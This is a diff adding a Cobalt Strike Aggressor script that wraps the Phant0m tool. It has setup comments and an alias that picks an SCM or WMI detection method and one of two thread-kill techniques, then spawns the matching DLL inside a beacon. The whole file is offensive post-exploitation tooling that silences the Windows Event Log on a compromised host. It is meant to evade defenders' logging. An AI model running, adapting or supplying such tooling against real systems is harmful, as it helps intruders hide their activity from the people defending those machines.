@@ -1,0 +1,40 @@
+# 1- Open the project (https://github.com/hlldz/Phant0m) in Microsoft Visual Studio, make the settings (select the detection and kill techniques) and compile.
+# 2- After set the DLL names on lines 14, 18, 27 and 31.
+# 3- Import script. Usage: phant0m DETECTION_TECHNIQUE (scm or wmi) KILL_TECHNIQUE (1 or 2)
+
+alias phant0m {
+	local('$detection_technique $kill_technique');
+
+	$detection_technique = $2;
+	$kill_technique = $3;
+
+	if($detection_technique eq "scm"){
+		if($kill_technique eq "1"){
+			blog($1, "\c0Phant0m will detect PID with SCM and kill service threads with Technique-1.");
+			bdllspawn($1, script_resource("scm_1.dll"), $2, "Phant0m - SCM, Technique-1", 5000, false);
+		}
+		else if ($kill_technique eq "2"){
+			blog($1, "\c0Phant0m will detect PID with SCM and kill service threads with Technique-2.");
+			bdllspawn($1, script_resource("scm_2.dll"), $2, "Phant0m - SCM, Technique-2", 5000, false);
+		}
+		else {
+			blog($1, "\c0Check your arguments.");
+		}
+	}
+	else if($detection_technique eq "wmi"){
+		if($kill_technique eq "1"){
+			blog($1, "\c0Phant0m will detect PID with WMI and kill service threads with Technique-1.");
+			bdllspawn($1, script_resource("wmi_1.dll"), $2, "Phant0m - WMI, Technique-1", 5000, false);
+		}
+		else if ($kill_technique eq "2"){
+			blog($1, "\c0Phant0m will detect PID with WMI and kill service threads with Technique-2.");
+			bdllspawn($1, script_resource("wmi_2.dll"), $2, "Phant0m - WMI, Technique-2", 5000, false);
+		}
+		else {
+			blog($1, "\c0Check your arguments.");
+		}
+	}
+	else {
+		blog($1, "\c0Check your arguments.");
+	}
+}
